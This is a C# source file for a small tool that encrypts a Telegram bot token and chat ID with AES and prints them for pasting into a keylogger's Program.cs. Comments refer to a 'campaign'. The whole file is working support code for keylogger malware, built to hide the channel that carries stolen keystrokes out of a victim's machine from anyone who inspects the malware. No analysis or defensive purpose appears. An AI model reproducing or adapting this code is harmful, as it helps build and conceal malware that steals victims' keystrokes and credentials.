using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace CredentialGenerator
{
    class Program
    {
        private static readonly byte[] _salt = new byte[] 
        { 
            0x4A, 0x8F, 0x2E, 0xC1, 0x9D, 0x3B, 0x7F, 0x55,
            0xE2, 0xA8, 0x0C, 0xD4, 0x6B, 0x91, 0x3E, 0x7C 
        };

        private static readonly byte[] _iv = new byte[]
        {
            0x1C, 0x8E, 0x4A, 0x2F, 0x9D, 0x6B, 0x3F, 0x7E,
            0xC2, 0xA1, 0x5D, 0x8B, 0xE4, 0x3C, 0x7A, 0x9F
        };

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: GenerateCredentials.exe <bot_token> <chat_id>");
                return;
            }

            string botToken = args[0];
            string chatId = args[1];

            string encryptedToken = EncryptString(botToken);
            string encryptedChatId = EncryptString(chatId);

            Console.WriteLine("Add these to (keylogger) Program.cs:\n");
            Console.WriteLine($"EncryptedBotToken = \"{encryptedToken}\";");
            Console.WriteLine($"EncryptedChatId = \"{encryptedChatId}\";");
        }

        private static string EncryptString(string plainText)
        {
            byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
            
            byte[] key = Rfc2898DeriveBytes.Pbkdf2(
                Encoding.UTF8.GetBytes(GetPassphrase()), 
                _salt, 
                100000, 
                HashAlgorithmName.SHA256, 
                32);
            
            using var aes = Aes.Create();
            aes.Key = key;
            aes.IV = _iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var encryptor = aes.CreateEncryptor();
            byte[] cipherBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
            
            return Convert.ToBase64String(cipherBytes);
        }

        private static string GetPassphrase()
		{
		    // Hardcoded — same on all machines.
		    // Change this to something unique for your campaign.
		    return "My$ecure!Campaign2024#Key";
		}
    }
}


